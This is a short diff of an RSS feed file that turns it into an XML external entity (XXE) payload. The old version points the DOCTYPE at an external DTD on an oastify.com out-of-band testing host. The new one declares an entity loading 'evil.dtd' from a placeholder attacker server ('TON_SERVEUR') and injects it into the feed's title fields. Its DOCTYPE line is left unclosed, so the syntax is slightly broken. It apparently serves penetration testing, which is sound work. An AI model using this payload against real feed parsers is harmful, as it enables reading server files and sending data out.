@@ -1,7 +1,15 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo SYSTEM "http://3aentzap1ub7zsn29u5sar7y4pagy9my.oastify.com/evil.dtd">
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://TON_SERVEUR/evil.dtd">
 <rss version="2.0">
 <channel>
-  <title>test</title>
+    <title>&xxe;</title>
+    <link>http://www.monblog.com</link>
+    <description>Les derniers articles</description>
+    <item>
+        <title>&xxe;</title>
+        <link>http://www.monblog.com/article1</link>
+        <description>Résumé de l'article 1</description>
+        <pubDate>Mon, 05 May 2026 10:00:00 GMT</pubDate>
+    </item>
 </channel>
 </rss>
